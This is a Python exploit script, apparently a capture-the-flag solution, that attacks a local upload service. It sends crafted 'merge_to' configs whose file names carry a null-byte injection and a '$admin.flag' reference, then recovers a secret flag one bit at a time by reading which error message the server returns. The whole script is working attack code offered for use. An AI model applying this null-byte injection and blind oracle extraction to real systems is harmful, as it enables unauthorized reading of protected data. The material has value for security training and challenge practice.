import requests
from itertools import zip_longest
from functools import reduce


def generate_config(flag):
    return {
        'queries': [
            {
                'name': 'merge_to',
                'file_name': '$admin.flag',
                'data': {},
            },
            {
                'name': 'merge_to',
                'file_name': f'{flag}\0flag',
                'data': '$operations',
            }
        ]
    }


def fill_grouper(iterable, n, fillvalue=None):
    return zip_longest(*[iter(iterable)] * n, fillvalue=fillvalue)

def bits_to_str(bits):
    return ''.join(chr(reduce(lambda current, bit: current << 1 | bit, byte)) for byte in fill_grouper(bits, 8, 0))

def main():
    flag_bits = []
    flag = ''
    while not flag or flag[-1] != '}':
        flag = bits_to_str(flag_bits + [1])
        out = requests.post('http://localhost:5000/upload', json=generate_config(flag)).content.decode()
        if 'You will not use the flag' in out:
            flag_bits.append(0)
        elif 'You will not even reach the flag' in out:
            flag_bits.append(1)
        else:
            raise ValueError(out)
        print(flag, end='\r')
    print(flag)


if __name__ == '__main__':
    main()
